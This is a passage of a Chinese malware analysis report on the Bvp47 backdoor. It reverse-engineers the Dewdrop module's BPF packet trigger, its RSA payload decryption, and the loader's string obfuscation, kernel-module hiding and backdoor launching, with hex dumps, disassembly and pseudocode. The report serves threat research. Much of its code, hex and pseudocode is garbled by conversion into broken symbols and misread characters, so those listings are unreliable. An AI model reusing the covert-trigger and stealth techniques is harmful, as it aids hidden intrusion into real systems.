<60h，0，0，4></td><td></td><td></td></tr><tr><td>08008380 5C</td><td>00 00 00 00 00 00 00+</td><td>bpf_insn <5Ch，0，0，0></td><td></td><td></td></tr><tr><td>08008380 07</td><td>00 00 00 OA 00 00 00</td><td>bpf_insn <7，0，0，0Ah></td><td></td><td></td></tr><tr><td>08008390 02</td><td>00 00 00 04 00 00 00+</td><td>bpf_insn <2,0,0,4></td><td></td><td></td></tr><tr><td>08008390 80</td><td>00 00 00 00 00 00 00</td><td>bpf_insn <80h，0，0，0></td><td></td><td></td></tr><tr><td>080083A0 1C</td><td>00 00 00 00 00 00 +00</td><td>bpf_insn <1ch,0,0,0></td><td></td><td></td></tr><tr><td>080083A0</td><td>07 00 00 00 OA 00 00 00</td><td>bpf_insn <7，0，0，0Ah></td><td></td><td></td></tr><tr><td>080083B0</td><td>48 00 00 00 00 00 00 00+</td><td>bpf_insn <48h，0，0，0></td><td></td><td></td></tr><tr><td>080083B0</td><td>02 00 00 00 06 00 00 00</td><td>bpf_insn <2,0,0，6></td><td></td><td></td></tr><tr><td>080083C0</td><td>61 00 00 00 04 00 00 00+</td><td>bpf_insn <61h,0,0,4></td><td></td><td></td></tr><tr><td>080083C0</td><td>30 00 00 00 17 00 00 00 15</td><td>bpf_insn<30h，0，0，17h></td><td></td><td></td></tr><tr><td>080083D0</td><td>00 00 05 06 00 00 +00</td><td>bpf_insn <15h,0，5,6></td><td></td><td></td></tr><tr><td>080083D0</td><td>30 00 00 00 2E 00 00 00 74</td><td>bpf_insn<30h，0，0，2Eh></td><td></td><td></td></tr><tr><td>080083E0</td><td>00 00 00 02 00 00 +00 14 00 00 00 14 00 00 00</td><td>bpf_insn <74h，0，0，2></td><td></td><td></td></tr><tr><td>080083E0</td><td>θC 00 +00</td><td>bpf_insn<14h，0，0，14h></td><td></td><td></td></tr><tr><td>080083F0</td><td>00 00 00 00 00 07 00 00 00 OA 00 00 00</td><td>bpf_insn n<och，0，0，0></td><td></td><td></td></tr><tr><td>080083F0</td><td>48 00 00 00 OE 00 00 +00</td><td>bpf_insn</td><td><7，0，0，0Ah> <48h，0，0，0Eh></td><td></td></tr><tr><td>08008400 08008400</td><td>02 00 00 00 08 00 00 00</td><td>bpf_insn</td><td></td><td></td></tr><tr><td>08008410</td><td>80 00 00 00 00 00 00 00+</td><td>bpf_insn <2,0,0,8> bpf_insn</td><td><80h，0，0，0></td><td></td></tr><tr><td>08008410</td><td>14 00 00 00 02 00 00 00</td><td>bpf_insn</td><td><14h,0，0，2></td><td></td></tr><tr><td>08008420 07</td><td>00 00 00 02 00 00 +00</td><td>bpf_insn</td><td><7，0,0,2></td><td></td></tr><tr><td>08008420 48</td><td>00 00 00 00 00 00 00</td><td>bpf_insn</td><td><48h，0，0,0></td><td></td></tr><tr><td>08008430 44</td><td>00 00 00 6A 9D 00 +00</td><td>bpf_insn</td><td>1<44h，0，0，9D6Ah></td><td></td></tr><tr><td>08008430 02</td><td>00 00 00 04 00 00 00</td><td></td><td><2,0,0,4></td><td></td></tr><tr><td>48</td><td>00 00 00 00 00 00 00+</td><td>bpf_insn</td><td></td><td></td></tr><tr><td>08008440</td><td></td><td>bpf_insn 1<48h，0，0，0></td><td></td><td></td></tr><tr><td>08008440 54</td><td>00 00 00 6A 9D 00 00</td><td>bpf_insn</td><td><54h，0，0，9D6Ah></td><td></td></tr><tr><td>08008450 84</td><td>00 00 00 00 00 00 +00</td><td>bpf_insn <84h，0，0，0></td><td></td><td></td></tr><tr><td>08008450 14 00 08008460</td><td>00 00 01 00 00 00 070000000A000000+</td><td>bpf_insn <14h,0,0,1> bpf_insn<7，0，0，0Ah></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  

#### 4. bpf_program和bpf_insn结构分别如下：  

<html><body><table><tr><td>00000000</td><td colspan="5"></td></tr><tr><td>00000000 00000000</td><td>bpf_program</td><td></td><td></td><td>struc ; (sizeof=0x8, align=0x4, copyof_65)</td><td></td><td></td></tr><tr><td>00000000</td><td></td><td></td><td></td><td></td><td>;XREF:.data:stru_8008300/r</td><td></td></tr><tr><td></td><td>00000000bf_len</td><td>pp</td><td></td><td>; pcap_t/r .</td><td></td><td></td></tr><tr><td></td><td>00000004bf_insns</td><td>pp</td><td></td><td>; offset</td><td></td><td></td></tr><tr><td></td><td>00000008bpf_program</td><td></td><td>ends</td><td></td><td></td><td></td></tr><tr><td>00000008</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>00000000</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>00000000</td><td>30000000 bpf_insn</td><td></td><td></td><td></td><td>struc ; (sizeof=0x8,align=0x4, copyof_34)</td><td></td></tr><tr><td>00000000</td><td></td><td></td><td></td><td></td><td></td><td>;XREF:.data:stru_8008320/r</td></tr><tr><td>300000oo code</td><td></td><td></td><td> Mp</td><td></td><td>：.data:08008330/r</td><td></td></tr><tr><td>30000002 jt</td><td></td><td></td><td>db?</td><td></td><td></td><td></td></tr><tr><td>30000003 jf</td><td></td><td></td><td>db?</td><td></td><td></td><td></td></tr><tr><td>30000004 k</td><td></td><td></td><td> pp</td><td></td><td></td><td></td></tr><tr><td></td><td>30000008 bpf_insn</td><td></td><td>ends</td><td></td><td></td><td></td></tr><tr><td>80000000</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  

#### 5. 经过bpf反汇编过后的代码如下：  

10: ld #len   
11: sub #6   
12: tax   
13: 1dh [x+0]   
14: or #0xe6cf   
15: st M[4]   
16: 1dh [x+0]   
17: and #0xe6cf   
18: neg   
19: sub #1   
110: tax   
111: 1d M[4]   
112: and x   
113: tax   
114: st M[4]   
115: ld #len   
116: sub X   
117: tax   
118: 1dh [x+0]   
119: st M[6]   
120: 1dx M[4]   
121: 1db [23]   
122: jeq #0x6,123,128   
123: 1db [46]   
124: rsh #2   
125: sub #20   
126: add x   
127: tax   
128: 1dh [x+14]   
129: st M[8]   
130: Id #len   
131: sub #2   
132: tax   
133: 1dh [x+0]   
134: or #0x9d6a   
135: st M[4]   
136: ldh [x+0]   
137: and #0x9d6a   
138: neg   
139: sub #1   
140: tax   
141: 1d M[4]   
142: and x   
143: tax   
144: 1d M[8]   
145: jeq x, 148, 146   
146: 1d M[6]   
147: jeq x, 148, 149   
148: ret #0xffff   
149: ret #0   
\*/  

6. 实际运行时的bpf伪代码如下，即满足该规则的payload数据会被捕获进入到下一个处理流程；  

nt check_v3(char\* buf, int size) if (size != 0x88) return 0; unsigned short start = \*(unsigned short\*) (buf + Ox00): unsigned short check0 = \*(unsigned short\*) (buf + 0x82): unsigned short check1 = \*(unsigned short\*) (buf + 0x84) : unsigned short check2 = \*(unsigned short\*) (buf + 0x86); start = (start >> 0x08)|((start & OxFF) << 0x08); unsigned short value0 = (unsigned _int8) ((unsigned _int16)(size ^ 0xE6CF) >> 8)| (((unsigned _int8)size ^0xCF) 《< 8); unsigned short value2 = (unsigned _int8) ((unsigned _int16) (start ^ Ox9D6A) >> 8) I (((unsigned _int8)start ^ Ox6A) << 8); if (value0 != checko) return 0; if (value2 != check2) return 0; return 1;  

### BPF隐蔽通信数据处理过程  

在满足BPF的捕获规则后，数据包会进入下一个流程来进行处理。  

1. 在函数sec_f_9b510b03中可以看到Dewdrop使用select模型来处理对应的数据包  

$\scriptstyle==1$ { $v6=1$ { $v6=\theta_{\cdot}$ $=0$ $\vee1=\theta$ ； $v8=\theta_{\cdot}$ $=$ bittestandset(&readfds.) ${\sf x x}[2^{\mathrm{~*~}}\lor1^{\mathrm{~+~}}\mathrm{~.~}$ 2]&0x1F); $\ll\vee1+$ { { { $=$ { continue; { goto LABEL_2;  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

#### 2. sec_f_6a42f4c9_allinone执行伪代码如下：  

{$==$   
{goto LABEL_12;了  

3. 在 sec_decode_packet 中就开始了payload数据包的解密工作，内部涉及到一处作了变形处理的RSA解密算法。  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

goto error;   
$v4=2$   
$\vee5=$   
{ $\vee4=1\theta$ $==$ goto error;   
1   
sys_memmove();   
$\scriptstyle{\vee6{\:\:}=}$ $=$ $=$ $\hat{}$ 0x9D6A;   
$v8~=~\cup7$ $v4==288$ $^+$ $==~6$   
{ $^+$   
}   
else   
f goto LABEL_6; $\vee2\Theta=$ $^+$ 0x34]; $<=$ ${}={}$ $\vee31~=~\vee11$ $2==\lor11$ $=$ $v8<=$ &&(sys_memmove(), $\begin{array}{r l}{{\mathsf{v}}{\mathsf{g}}}&{{}=}\end{array}$ $\vee31~=~\vee9$ $2\c=\vee9$   
{ $=$ $^+$ $<=$ sys_memmove(); $==2$ $\vee12=2$ { goto error; sys_memmove(); HIWORD(xx) $=$ 0; $=$ HIDWORD(V15) $=$ $=$  

### BPF隐蔽通信数据格式与加密算法  

1. Dewrop模块v3系列的载荷（payload）数据包格式如下：  

#### “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/63bd06a612a61d77a58fc9c53bcaf7b5c0b107ac9d68b75f11a7436695d2dc4c.jpg)  

#### 2. tipoff中对Dewdrop模块的载荷（payload）数据包流程如下：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/bbeabb6bf2531fa7890fd02a02284a84d1f04ff2ec612ab44f9eb4845e9ad7d9.jpg)  

#### 3. payload数据包中的RSA数据加密  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

1lint _cdecl tipoff_trigger(BYTE \*srcBin, BYTE \*dstBin, BYTE \*privateKey) unsigned int v3; // eax unsigned int v4; // edx sub_804D480((int)srcBin, $\mathtt{0x86}$ ); $v3=*$ $^+$ 0x1F); $v4=*$ $^+$ 0x1F); $^+$ $=$ tipoff_rsa_core( 0x20, $^+$ 0x80), 0x20, 0x20, $^+$ 0x100), 0x21, byte_8058660); return sub_804D480((int)dstBin, 0x80);  

### Bvp47_loader技术细节  

loader模块的入口函数图具体如下，中间会涉及到：  

1. 检测运行时环境是否正常；  
2. 读取文件尾部的payloads；  
2. 映射和校验payload有效性；  
4. 解密payload，如果需要解密；  
5. 解压缩payload，如果需要解压缩；  
6. 装载内核模块；  
7. 调用通知隐藏内核模块的ELF文件头；  
8. fork执行Dewdrop模块后门；  
9. fork执行“饮茶”（Suctionchar_Agent）程序后门；  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/97585670b0946ceffa64a91448b01a0a4bbbd79bb7e9fb83fb6342481efc8b47.jpg)  

#### 在样本分析过程中，首先需要处理应对的是一系列的字符串加密函数，共8处。  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/4cb6b0a4d727cc4d7872b7cc25b1a91f08f1bc5d23ee4003312c4d074ee05b78.jpg)  
1. 异或0x47函数类型1：  

#### 2. 异或0x47函数类型2：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/149d87791459d2ab606172194cb6317f587a0bfdc09b9a91e238692b9d68259f.jpg)  

#### 3. 变序加密函数：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/3aae3eba405a13c37216c4539610becab96edab9a786e732cd31940492aa08bb.jpg)  

#### 4. 异或0x47函数类型3：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/8bec3ace797791923ecc29b93e7eedd7ddd288c9639ed3ce7baceea1ee8d3c15.jpg)  

#### 5. 异或0x47类型4：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/4f23fd2c2c070f3f87e17fc06585bd1aa6465c3af5e1d506624136d31a4f5baf.jpg)  

#### 6. 异或0x47  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/8bc88b67a735333d309b57f7ecc1a15e114cb89aa7b2095099fccef96746e8a2.jpg)  

#### 7. 加密函数  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/2774fba8192bce3df3009ba947ddbdf651655d4e5c4c59dc807086e47ebc8fd3.jpg)  

#### 8. 异或0x47函数类型5  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/3f246bf444b78f04c384a982a31551f6558ccd4d43e771c7b709e80d46315c98.jpg)  

#### 载荷 （payload）相关的加密方式  

载荷（payload）在被装载过程中主要有5种解密方式。  

方式一：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/3bd479260fe15934a54120e4e3fe7b64f48865dee0123c4658da58ac8914b54e.jpg)  

方式二：  

LOAD:0804A390   
LOAD:0804A390   
LOAD:0804A390 $\mathbf{\varepsilon}=$   
LOAD:0804A390 $=$   
LOAD:0804A390 $=$   
LOAD:0804A390 $\Bumpeq$   
LOAD:0804A390 $\asymp$   
LOAD:0804A390 $\Bumpeq$   
LOAD:0804A390 ${}={}$   
LOAD:0804A390 $=$   
LOAD:0804A390 $=$   
LOAD:0804A390 $\Bumpeq$   
LOAD:0804A390 $=$ dword ptr   
LOAD:0804A390 ${}={}$ dword ptr   
LOAD:0804A390 ${}={}$   
LOAD:0804A390 $=$   
LOAD:0804A390 $\Bumpeq$ dword ptr   
LOAD:0804A390 $=$ dword ptr   
LOAD:0804A390   
LOAD:0804A390 55 push ebp   
LOAD:0804A391 89 E5 mov   
LOAD:0804A393 83 EC 48 sub   
LOAD:0804A396 8B 45 10   
LOAD:0804A399 8B 55 14 edx, [ebp+arg_-C]   
LOAD:0804A39C 895DF4 mov   
LOAD:0804A39F 8B5D 0C ebx, [ebp+dd]   
LOAD:0804A3A2 89 75F8   
LOAD:0804A3A5 8D75C8   
LOAD:0804A3A8 89 45 D0 mov   
LOAD:0804A3AB 8B 45 18   
LOAD:0804A3AE 8955 D4   
LOAD:0804A3B1 8B55 1C   
LOAD:0804A3B4 89 7D FC mov   
LOAD:0804A3B7 BF 0D0000 00   
LOAD:0804A3BC C7 45 E4 FF FF FF FF   
LOAD:0804A3C3 89 45 C8 [ebp+val], eax   
LOAD:0804A3C6 89 55 CC mov   
LOAD:0804A3C9 C7 45 E0 00 00 00 00   
LOAD:0804A3D0 89 74 24 04 [esp+4],esi   
LOAD:0804A3D4 89 1C 24 [esp], ebx   
LOAD:0804A3D7 E874 59 00 00 call serial_bind_0xd1eb34ee_decode   
LOAD:0804A3DC3D 0301 00 00   
LOAD:0804A3E1 74 25 short 1oc_804A408   
LOAD:0804A3E3   
LOAD:0804A3E3 loc_804A3E3:   
LOAD:0804A3E3   
LOAD:0804A3E3 8B 55 E4   
LOAD:0804A3E6 8D 42 FF lea   
LOAD:0804A3E9 83 F8 FD cmp   
LOAD:0804A3EC 77 08 ja short 1oc_804A3F6   
LOAD:0804A3EE 89 14 24 mov [esp], edx   
LOAD:0804A3F1 E8 9A 64 01 00   
LOAD:0804A3F6   
LOAD:0804A3F6 loc_804A3F6:   
LOAD:0804A3F6 89 F8   
LOAD:0804A3F8 8B 5D F4   
LOAD:0804A3FB 8B 75 F8   
LOAD:0804A3FE 8B 7D FC  

方式三：  

<html><body><table><tr><td>LOAD:0804A460</td><td>decode_callback_t3 proc near</td><td></td><td>；DATA XREF:main+B15↓o</td></tr><tr><td>LOAD:0804A460</td><td>var_40</td><td>= dword ptr -40h</td><td></td></tr><tr><td>LOAD:0804A460 LOAD:0804A460</td><td>var_3C</td><td>dword ptr -3Ch</td><td></td></tr><tr><td>LOAD:0804A460</td><td>val</td><td>= dwordptr -38h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_34</td><td>= dword ptr -34h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_30</td><td>dword ptr -30h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_2C</td><td>= dword ptr -2Ch</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_28</td><td>= byte ptr -28h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_20</td><td>dword ptr -20h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>var_1c</td><td>= dword ptr -1Ch</td><td></td></tr><tr><td>LOAD:0804A460</td><td>buf</td><td>=dword ptr θCh</td><td></td></tr><tr><td>LOAD:0804A460</td><td>arg_8</td><td>10h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>arg_c</td><td>dword ptr = dword ptr 14h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>arg_10</td><td>= dword ptr 18h</td><td></td></tr><tr><td>LOAD:0804A460</td><td>arg_14</td><td></td><td></td></tr><tr><td>LOAD:0804A460</td><td></td><td>=dword ptr 1Ch</td><td></td></tr><tr><td>LOAD:0804A460 55</td><td></td><td>push ebp</td><td></td></tr><tr><td>LOAD:0804A461 89 E5</td><td></td><td>mov ebp, esp</td><td></td></tr><tr><td>LOAD:0804A463 57</td><td></td><td>push edi</td><td></td></tr><tr><td>LOAD:0804A464 56</td><td></td><td>push esi</td><td></td></tr><tr><td>LOAD:0804A465 53</td><td></td><td>push ebx</td><td></td></tr><tr><td>LOAD:0804A4668 83EC4C</td><td></td><td>sub 4Ch</td><td></td></tr><tr><td>LOAD:0804A469 8B 55 14</td><td></td><td>esp, edx,</td><td>[ebp+arg_C]</td></tr><tr><td>LOAD:0804A46C 8B7D0C</td><td></td><td>mov mov edi,</td><td>[ebp+buf]</td></tr><tr><td>LOAD:0804A46F 8B5D18</td><td></td><td>mov ebx,</td><td>[ebp+arg_10]</td></tr><tr><td>LOAD:0804A472 8B 75 1C</td><td></td><td>mov esi,</td><td>[ebp+arg_14]</td></tr><tr><td>LOAD:0804A475 8B 45 10</td><td></td><td>mov eax,</td><td>[ebp+arg_8]</td></tr><tr><td>LOAD:0804A478 89 55 D4</td><td></td><td>mov</td><td>[ebp+var_2C], edx</td></tr><tr><td>LOAD:0804A47B 8D 55 C8</td><td></td><td>lea edx,[ebp+val]</td><td></td></tr><tr><td>LOAD:0804A47E 89 542404</td><td></td><td>mov [esp+4],edx</td><td>；val</td></tr><tr><td>LOAD:0804A482 89 55 C0</td><td></td><td>mov</td><td>[ebp+var_40],edx</td></tr><tr><td>LOAD:0804A485 89 45 D0</td><td></td><td>mov</td><td>[ebp+var_30], eax</td></tr><tr><td>LOAD:0804A488 89 5DC8</td><td></td><td></td><td>[ebp+val], ebx</td></tr><tr><td>LOAD:0804A48B 89 75 CC</td><td></td><td>mov mov</td><td>[ebp+var_34], esi</td></tr><tr><td>LOAD:0804A48E C745E4FFFFFFFF</td><td></td><td>mov</td><td>[ebp+Var_1C], 0FFFFFFFFh</td></tr><tr><td>LOAD:0804A495 C7 45E000000000</td><td></td><td>mov</td><td>[ebp+var_20],0</td></tr><tr><td>LOAD:0804A49C8 89 93C24</td><td></td><td>mov [esp],edi</td><td>；buf</td></tr><tr><td>LOAD:0804A49F E8AC580000</td><td></td><td>call</td><td>serial_bind_0xd1eb34ee_decode</td></tr><tr><td>LOAD:0804A4A4 8B 355CO</td><td></td><td>mov</td><td>edx，[ebp+var_40]</td></tr><tr><td>LOAD:0804A4A7( C745C40D000000</td><td></td><td>mov</td><td>[ebp+var_3C],0Dh</td></tr><tr><td>LOAD:0804A4AE 3D03010000</td><td></td><td>cmp</td><td>eax,103h</td></tr><tr><td>LOAD:0804A4B3 74 59</td><td></td><td>jz</td><td>short 1oc_804A50E</td></tr><tr><td>LOAD:0804A4B5</td><td></td><td></td><td></td></tr><tr><td>LOAD:0804A4B5</td><td>loc_804A4B5:</td><td></td><td>;CODE XREF:decode_callback_t3+CF↓j</td></tr><tr><td>LOAD:0804A4B5</td><td></td><td></td><td>decode_ca11back_t3+133↓j</td></tr><tr><td>LOAD:0804A4B5 8B 45 E4</td><td></td><td>mov</td><td>eax,[ebp+var_1c]</td></tr><tr><td>LOAD:0804A4B8 8D 50 FF</td><td></td><td>lea</td><td>edx,[eax-1]</td></tr><tr><td>LOAD:0804A4BB 383FAFD</td><td></td><td>cmp</td><td>edx, 0FFFFFFFDh</td></tr><tr><td>LOAD:0804A4BE0F86B4000000</td><td></td><td>jbe</td><td>1oc_804A578</td></tr><tr><td>LOAD:0804A4C4</td><td></td><td></td><td></td></tr><tr><td>LOAD:0804A4C4</td><td>loc_804A4C4:</td><td></td><td>;CODE XREF:decode_callback_t3+127↓j</td></tr><tr><td>LOAD:0804A4C48B35004B0608</td><td></td><td>mov</td><td>esi,ds:g_section_count0</td></tr><tr><td>LOAD:0804A4CA 85 F6</td><td></td><td>test</td><td>esi, esi</td></tr><tr><td>LOAD:0804A4CC 74 2B</td><td></td><td>jz</td><td>short 1oc_804A4F9</td></tr><tr><td>LOAD:0804A4CE 31 DB</td><td></td><td>xor</td><td>ebx，ebx</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></table></body></html>  

方式四：  

2/9/13 17:59 “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘 LOAD:0804A5C0 LOAD:0804A5C0 LOAD:0804A5C0 LOAD:0804A5C0 $=$ LOAD:0804A5C0 $\mathbf{\varepsilon}=$ LOAD:0804A5C0 $=$ LOAD:0804A5C0 $=$ LOAD:0804A5C0 $=$ LOAD:0804A5C0 $=$ LOAD:0804A5C0 ${}={}$ LOAD:0804A5C0 ${}={}$ LOAD:0804A5C0 $\asymp$ LOAD:0804A5C0 $=$ dword ptr LOAD:0804A5C0 $=$ dword ptr LOAD:0804A5C0 $=$ dword ptr LOAD:0804A5C0 $=$ LOAD:0804A5C0 LOAD:0804A5C0 55 push ebp LOAD:0804A5C1 89 E5 mov ebp, esp   
·LOAD:0804A5C3 57 push edi LOAD:0804A5C4 BF 0D 00 00 00   
·LOAD:0804A5C9 56 push esi   
·LOAD:0804A5CA 53 push ebx LOAD:0804A5CB 83 EC 3C   
·LOAD:0804A5CE 8B 45 10   
·LOAD:0804A5D1 8B 55 14   
·LOAD:0804A5D4 8D 75 C8   
·LOAD:0804A5D7 8B 5D 0C ebx, [ebp+buf] LOAD:0804A5DA C7 45 E4 FF FF FF FF LOAD:0804A5E1 89 45 D0   
LOAD:0804A5E4 8B4518 mov LOAD:0804A5E7 89 55 D4 mov LOAD:0804A5EA 8B 55 1C mov LOAD:0804A5EDC7 45E0 0000 0000   
·LOAD:0804A5F4 89 74 24 04 mov   
·LOAD:0804A5F8 89 45 C8 mov [ebp+val], eax LOAD:0804A5FB 89 55 CC mov LOAD:0804A5FE 89 1C 24 [esp], ebx LOAD:0804A601 E8 4A 57 00 00 seria1_bind_0xd1eb34ee_decode LOAD:0804A606 3D 03 01 00 00 LOAD:0804A60B 74 58 short loc_804A665 LOAD:0804A60D LOAD:0804A60D loc_804A60D: LOAD:0804A60D LOAD:0804A60D 8B 45 E4 mov LOAD:0804A610 8D 50 FF LOAD:0804A613 83 FA FD LOAD:0804A616 0F 86 8C 0000 00 1oc_804A6A8 LOAD:0804A61C LOAD:0804A61C loc_804A61C: LOAD:0804A61C A1 04 4B 06 08 LOAD:0804A621 85 C0   
·LOAD:0804A623 74 2C short loc_804A651   
·LOAD:0804A625 31 DB LOAD:0804A627 90 LOAD:0804A628 LOAD:0804A628 loc_804A628:   
·LOAD:0804A628 8B 14 DD 20 4D 06 08   
·LOAD:0804A62F 85 D2  

方式五：  

#  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/60fc94d691e97f4b032a0b01688b32a135db5c0a6f7a361a7566e5f942dab40d.jpg)  

#### 载荷 （payload） 解密流程  

如前面所见到的main函数主体流程，载荷（payload）  解析过程是一个相对复杂的循环体流程，且伴随了诸多加密对抗。  

映射和加载：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/8b6e177fc1f3f5291b1e1e7f2dd7b9d0cb0fd9e84190174c25d80494dd758f7a.jpg)  

解析流程：  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/a459a5ee83eca94ec17609d13e988b8cd2689a854415ac79df7e335c307a22ec.jpg)  

![](https://cdn-mineru.openxlab.org.cn/extract/11c1673a-23fa-4bfd-b69a-b8199525982a/6e00f51789555c6524d4b404f23a9d63b9840141221236dc1cd093b8118ff096.jpg)  
“电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

#### 涉及到的解压缩流程：  

linux_gzip函数:  

“电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  


<html><body><table><tr><td>LOAD:0805717055</td><td></td><td>push</td><td>ebp</td></tr><tr><td>LOAD:08057171 31 D2</td><td></td><td>xor</td><td>edx,edx</td></tr><tr><td>LOAD:08057173 89 E5</td><td></td><td>mov</td><td>ebp，esp</td></tr><tr><td>LOAD:08057175！ 57</td><td></td><td>push</td><td>edi</td></tr><tr><td>LOAD:08057176 BF</td><td>01000000</td><td>mov</td><td>edi,1</td></tr><tr><td>LOAD:0805717B 56</td><td></td><td>push</td><td>esi</td></tr><tr><td>LOAD:0805717C BE</td><td>1F000000</td><td>mov</td><td>esi，1Fh</td></tr><tr><td>LOAD:08057181 53</td><td></td><td>push</td><td>ebx</td></tr><tr><td>LOAD:08057182 83</td><td>EC5C</td><td>sub</td><td>esp, 5Ch</td></tr><tr><td>LOAD:08057185 8B</td><td>5D0C</td><td>mov</td><td>ebx， [ebp+dst_len]</td></tr><tr><td>LOAD:08057188 8B</td><td>45 08</td><td>mov</td><td>eax,[ebp+dst_buf]</td></tr><tr><td>LOAD:0805718B C7</td><td>05 30 5A060800000000</td><td>mov</td><td>ds:dword_8065A30, 6</td></tr><tr><td>LOAD:08057195 C7</td><td>05 28 5A060800000000</td><td>mov</td><td>ds:g_gzip_key,0</td></tr><tr><td>LOAD:0805719F C7</td><td>05 3C5A060800000000</td><td>mov</td><td>ds:dword_8065A3C，</td></tr><tr><td>LOAD:080571A9 A3 LOAD:080571AE 31</td><td>205A0608</td><td>mov</td><td>ds:dword_8065A20，eax</td></tr><tr><td>LOAD:080571B0 C7</td><td>cO</td><td>xor</td><td>eax，eax</td></tr><tr><td>LOAD:080571BA C7</td><td>05 385A060800000000 05405A060800000000</td><td>mov</td><td>ds:dword_8065A38，</td></tr><tr><td>LOAD:080571C4 C7</td><td>05 44</td><td>mov</td><td>ds:dword_8065A40,</td></tr><tr><td>LOAD:080571CE 68</td><td>45A060800000000</td><td>mov</td><td>ds:dword_8065A44,</td></tr><tr><td>LOAD:080571D4895DE4</td><td>1D245A0608</td><td>mov</td><td>ds:dword_8065A24, ebx</td></tr><tr><td>LOAD:080571D7 90</td><td></td><td>mov</td><td>[ebp+var_1c], ebx</td></tr><tr><td>LOAD:080571D8</td><td></td><td>nop</td><td></td></tr><tr><td>LOAD:080571D8</td><td>loc_80571D8:</td><td></td><td>；CODE XREF:linuX_gzip+7D↓j</td></tr><tr><td>LOAD:080571D889F1</td><td></td><td>mov</td><td>ecx,esi</td></tr><tr><td>LOAD:080571DA 89 FB</td><td></td><td>mov</td><td>ebx，edi</td></tr><tr><td>LOAD:080571DC</td><td>2B0C9580230608</td><td>sub</td><td>ecx， ds:dword_8062380[edx*4]</td></tr><tr><td>LOAD:080571E3</td><td>83C201</td><td>ppe</td><td>edx，1</td></tr><tr><td>LOAD:080571E6 D3 E3</td><td></td><td>sh1</td><td>ebx,cl</td></tr><tr><td>LOAD:080571E8 09 D8</td><td></td><td>or</td><td>eax，ebx</td></tr><tr><td>LOAD:080571EA 83 FA 0E</td><td></td><td>cmp</td><td>edx，OEh</td></tr><tr><td>LOAD:080571ED 75 E9</td><td></td><td>jnz</td><td>short 1oc_80571D8</td></tr><tr><td>LOAD:080571EF</td><td>8B5DE4</td><td>mov</td><td>ebx,[ebp+var_1C]</td></tr><tr><td>LOAD:080571F2</td><td>BF01000000</td><td>mov</td><td>edi，1</td></tr><tr><td>LOAD:080571F7</td><td>C705605A060800000000</td><td>mov</td><td>ds:dword_8065A60，0</td></tr><tr><td>LOAD:08057201</td><td>8DB42600000000</td><td>lea</td><td>esi,[esi+0]</td></tr><tr><td>LOAD:08057208</td><td></td><td></td><td></td></tr><tr><td>LOAD:08057208</td><td>loc_8057208:</td><td></td><td>；CODE XREF:1inuX_gzip+D8↓j</td></tr><tr><td>LOAD:08057208 89F9 LOAD:0805720A 31 D2</td><td></td><td>mov</td><td>ecx,edi</td></tr><tr><td>LOAD:0805720C 80CD01</td><td></td><td>xor</td><td>edx，edx</td></tr><tr><td></td><td></td><td>or</td><td>ch.1</td></tr></table></body></html>  

linux_gzip_inflate_fixed函数：  

# “电幕行动”（Bvp47）技术细节报告（二）——关键组件深度揭秘  

LOAD:08056FE0 55 push ebp   
LOAD:08056FE1 89 E5   
LOAD:08056FE3 56 push   
LOAD:08056FE4 BE 03 00 00 00   
LOAD:08056FE9 53 push ebx   
LOAD:08056FEA 83 EC 30 sub   
LOAD:08056FED C7 04 24 80 04 00 00 mov   
LOAD:08056FF4 E8 63 2A FF FF call   
